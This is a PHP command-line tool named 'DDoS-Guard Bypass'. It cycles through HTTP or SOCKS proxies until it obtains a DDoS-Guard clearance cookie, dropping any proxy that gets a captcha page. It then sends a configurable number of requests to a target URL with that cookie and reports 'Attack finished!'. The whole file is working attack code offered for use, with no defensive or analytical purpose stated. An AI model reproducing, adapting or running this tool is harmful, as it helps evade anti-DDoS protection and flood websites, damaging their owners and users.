<?php
/*
Name: DDoS-Guard Bypass
Description: Bypasses DDoS-Guard's system. This can be improved, but don't feel like porting it to another language.

Coded by Mo.
Started: 05/07/2020
Last Edited: 05/08/2020
Discord: mo.#1337
*/
error_reporting(0);
$url = $argv[1];
$requests = $argv[2]; if($requests == null) { $requests = "5"; }
$timeout = $argv[3]; if($timeout == null) { $timeout = "3"; }
$delay = $argv[4]; if($delay == null) { $delay = "3"; }
$file = $argv[5]; if($file == null) { $file = "proxies.txt"; }
$type = $argv[6];

//Usage
if($url == null || $requests == null || $timeout == null || $delay == null || $file == null || $type == null){
	echo "Usage: php bypass.php <URL> <REQUESTS> <TIMEOUT TO CLOSE CONNECTION/3> <DELAY IN BETWEEN ATTACKS/3> <PROXIES.TXT> <HTTPS/SOCKS4/SOCKS5>\n";
	die();
}

//Determing what proxies to use
$type = strtoupper($type);
if($type == "SOCKS4") { $protocol = "socks4://"; }
if($type == "SOCKS5") { $protocol = "socks5://"; }
if($type == "HTTPS" || $type == "HTTP") { $protocol = ""; }

echo "----------------------------------------------\n\n";

echo " ██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔════╝ ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██║  ███╗███████║ ╚████╔╝ ██████╔╝███████║███████╗███████╗
██║   ██║██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
╚██████╔╝██║  ██║   ██║   ██║     ██║  ██║███████║███████║
 ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝\n\n";

echo "----------------------------------------------\n";


echo "[+] Target: $url\n";
echo "[+] Timeout: $timeout\n";
echo "[+] Delay: $delay\n";
echo "[+] Proxy Type: $type\n";

echo "----------------------------------------------\n";

//First request needed to get cookie... Attempts 5 times to get a valid cookie, and also to test proxy.
for ($x = 1; $x <= 30; $x++) {
	
	//Grabbing the proxy
	$f_contents = file($file);
    $proxy = $f_contents[rand(0, count($f_contents) - 1)];
	$proxy = preg_replace('/\s+/', '', $proxy);
	if($proxy == null){ 
		echo "[-] Failed to load proxy list! Ending...\n";
		die();
	}
	echo "[+] Proxy: $proxy\n";
	$cookie_location = "$proxy.txt";
	
	//Checks if attack is on-going
	if (file_get_contents($cookie_location) != null) {
		echo "[+] This proxy is already being used! Use 'rm -rf *.txt' if you feel like this is an error... Ending...\n";
	} else {

		//Request 1
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_PROXY, ''.$protocol.''.$proxy.'');
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$proxy.'.txt');
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
			'Accept-Language: en-US,en;q=0.5',
			'DNT: 1',
			'Connection: keep-alive',
			'Upgrade-Insecure-Requests: 1',
			'TE: Trailers'
		));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
		$rt = curl_exec($ch);
		$info = curl_getinfo($ch);
		curl_close ($ch);
		
		//Blank Web Request, bad proxy?
		if($rt == null) {
			echo "[-] Web returned blank, retrying with new proxy...\n";
		} else {
			//Captcha
			if(strpos($rt, 'We are receiving a lot of suspicious requests') !== false || strpos($rt, 'DDoS protection by DDoS-GUARD') !== false) {
				echo "[-] Captcha, retrying with new proxy...\n";
			} else {
				break; //Good, let's continue!
			}
		}
	}
}

//Final checks for request #1
if($rt == null) {
	echo "[-] Web returned blank, ending...\n";
	die();
}

if(strpos($rt, 'We are receiving a lot of suspicious requests') !== false) {
	echo "[-] Captcha, ending...\n";
	die();
}

echo "----------------------------------------------\n";

//Parsing Cookie
$getcookie = file_get_contents(''.$proxy.'.txt');

$getcookie1 = preg_replace('/\s+/', '_', $getcookie);
$first_step1 = explode('ddg1_' , $getcookie1);
$second_step1 = explode("_" , $first_step1[1] );
$secret = $second_step1[0];

if($secret == null) {
	echo "[-] Could not find cookie! Ending...\n";
	die();
} else {
	echo "[+] Found cookie: $secret\n";
}

echo "[+] Sending $requests requests to $url\n";

echo "----------------------------------------------\n";

//Send the attack, request #2
for ($x = 1; $x <= $requests; $x++) {
		
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_PROXY, $proxy);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
		'Accept-Language: en-US,en;q=0.5',
		'DNT: 1',
		'Connection: keep-alive',
		'Upgrade-Insecure-Requests: 1',
		'TE: Trailers',
		'Cookie: '. $secret
	));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
	$rt2 = curl_exec($ch);
	$info = curl_getinfo($ch);
	curl_close ($ch);
	
	if($rt == null) {
		echo "[#$x] Blank web request!\n";
	} else {
		echo "[#$x] Sent request to $url\n";
	}
	
	if(strpos($rt2, 'We are receiving a lot of suspicious requests') !== false) {
		echo "Captcha detected! Ending...\n";
		unlink($cookie_location);
		break;
	}
	sleep($delay); //Delay 2 seconds!
}

echo "Attack finished!\n";
unlink($cookie_location);

?>